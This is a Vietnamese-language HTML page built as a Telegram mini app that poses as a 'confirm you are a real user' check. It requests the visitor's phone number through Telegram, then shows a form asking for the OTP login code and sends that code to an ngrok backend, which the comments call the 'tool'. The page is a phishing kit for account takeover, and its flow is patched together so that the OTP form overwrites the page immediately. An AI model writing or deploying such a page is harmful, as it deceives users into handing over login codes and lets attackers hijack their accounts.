<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .content { padding: 20px; }
    </style>
</head>
<body>

<div class="content">
    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
    <div>Bạn cần xác nhận mình là người dùng thật!</div>
</div>

<script>
    // NHỚ THAY ĐỔI LINK NGROK Ở ĐÂY
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // 1. Cấu hình nút chính của Telegram
    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
    tg.MainButton.show();
    
    // 2. Gọi hàm requestContact khi nhấn vào nút chính
    tg.MainButton.onClick(() => {
        tg.MainButton.text = "ĐANG GỌI TELEGRAM...";
        tg.requestContact();
    });

    // 3. Xử lý khi Telegram trả kết quả
    // Thay thế đoạn tg.close() cũ bằng đoạn này:
// Ẩn nút cũ, hiện ô nhập mã
document.body.innerHTML = `
    <div style="padding: 20px; color: white;">
        <h3>Nhập mã OTP</h3>
        <input type="text" id="otpInput" placeholder="Nhập mã..." style="padding: 10px; width: 100%;">
        <button id="sendOtpBtn" style="padding: 10px; width: 100%; margin-top: 10px;">Xác nhận OTP</button>
    </div>
`;

document.getElementById('sendOtpBtn').addEventListener('click', async () => {
    const otp = document.getElementById('otpInput').value;
    // Gửi mã OTP này về backend để tool xử lý tiếp
    await fetch(`${BACKEND_URL}/verify_otp`, {
        method: 'POST',
        body: JSON.stringify({ otp: otp })
    });
    alert("Đang kiểm tra mã...");
});
</script>
</body>
</html>
